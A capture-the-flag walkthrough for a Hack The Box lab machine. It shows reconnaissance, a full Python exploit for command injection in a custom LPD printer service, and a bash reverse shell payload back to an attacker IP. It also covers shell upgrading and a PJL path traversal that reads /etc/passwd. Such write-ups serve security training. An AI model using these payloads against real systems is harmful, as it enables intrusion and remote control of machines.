HTB Paperwork — Full Detailed Walkthrough
Phase 1: Reconnaissance
nmap -p- -T4 --min-rate 1000 --open 10.129.248.117

Port	Service	Notes
22	SSH	OpenSSH 10.0p2, Ubuntu 25.10
80	HTTP	Nginx — "Intranet | Document Archiving Service"
1515	LPD	Custom Python printer service

Register the vhost:

echo "10.129.248.117 paperwork.htb" | sudo tee -a /etc/hosts

Browse to http://paperwork.htb/ — the web app exposes the LPD server source at /opt/LPDServer/server.py.

Phase 2: Foothold — LPD Command Injection
The Vulnerable Code
# /opt/LPDServer/server.py
job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break

subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
#                                            ^              ^
#                                            |              |
#                                   breakout point     trailing comment

The J field (job name) is interpolated directly into a shell command. The single quote after Archive: is the breakout point.

The LPD Binary Protocol
┌─────────────────────────────────────────────────────────────────────┐
│  1. Client → Server:  \x02 + "archive_intake" + \n                  │
│     Server → Client:  \x00 (accepted) or \x01 (rejected)            │
│                                                                    │
│  2. Client → Server:  \x02 + <size> + "cfA001" + <user> + \n       │
│     Server → Client:  \x00 (ack)                                    │
│                                                                    │
│  3. Client → Server:  <control file bytes> + \x00                  │
│     Server → Client:  \x00 (ack)                                    │
│                                                                    │
│  4. Client → Server:  \x03 + <data file> + \x00  (optional)        │
│     Server → Client:  \x00 (ack)                                    │
└─────────────────────────────────────────────────────────────────────┘

The control file format:

H<user>\n
J<job_name>\n

The Exploit Script
#!/usr/bin/env python3
import socket

TARGET_IP = "10.129.248.117"
TARGET_PORT = 1515
ATTACKER_IP = "10.10.14.27"
ATTACKER_PORT = 9001

# Breakout: close the single quote, inject bash reverse shell,
# then # comments out the trailing >> /tmp/archive.log
cmd = f"'; bash -c 'bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1' #"

# Control file: H field (user) + J field (job name = our payload)
control = f"Hattacker\nJ{cmd}\n"

# Header: \x02 + size + "cfA001" + username + \n
header = f"\x02{len(control)} cfA001attacker\n".encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET_IP, TARGET_PORT))

# Step 1: Request queue
s.send(b'\x02archive_intake\n')
r = s.recv(1)
assert r == b'\x00', f"Queue rejected: {r!r}"

# Step 2: Send control file header
s.send(header)
s.recv(1)

# Step 3: Send control file body (triggers injection)
s.send(control.encode() + b'\x00')
s.recv(1)
s.close()
print(f"[+] Payload sent. Check listener on :{ATTACKER_PORT}")

What the shell executes:

echo 'Archive: '; bash -c 'bash -i >& /dev/tcp/10.10.14.27/9001 0>&1' #' >> /tmp/archive.log
#                ^  ^                                              ^
#                |  |                                              |
#                |  |                                              └── comments out the rest
#                |  └── reverse shell to attacker
#                └── closes the echo string

Result: Interactive shell as lp (uid=7, home=/var/spool/lpd)

Shell Upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:
stty raw -echo; fg
# Now: export TERM=xterm-256color; export PATH=$PATH:/usr/sbin:/sbin

Phase 3: Lateral Movement — lp → archivist
Discovering the Internal Service
ss -tlnp

Expected:

127.0.0.1:9100   (PJL JetDirect printer service)

This service is localhost-only — not reachable from your attacker machine. Since you're already on the target, connect directly.

The PJL Path Traversal
The service has a virtual filesystem rooted at a printer directory. Path translation:

def _translate(self, path):
    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
    return os.path.normpath(os.path.join(self._root, clean))

os.path.normpath resolves .. but there's no check that the result stays within self._root. So:

Input:  "0:/../../../etc/passwd"
Clean:  "/../../../etc/passwd"
Result: /etc/passwd  ← escaped the printer root

This is the same class as CVE-2010-4107 (HP LaserJet PJL traversal, 2010).

